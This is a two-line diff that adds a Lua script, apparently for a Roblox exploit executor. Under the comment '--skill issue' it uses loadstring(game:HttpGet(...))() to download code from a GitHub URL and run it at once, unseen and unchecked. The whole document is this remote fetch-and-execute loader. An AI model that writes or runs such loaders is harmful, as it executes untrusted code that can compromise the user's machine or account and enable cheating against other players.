@@ -1,0 +1,2 @@
+--skill issue
+loadstring(game:HttpGet('https://github.com/SortSad/Dagm1/blob/main/main'))()
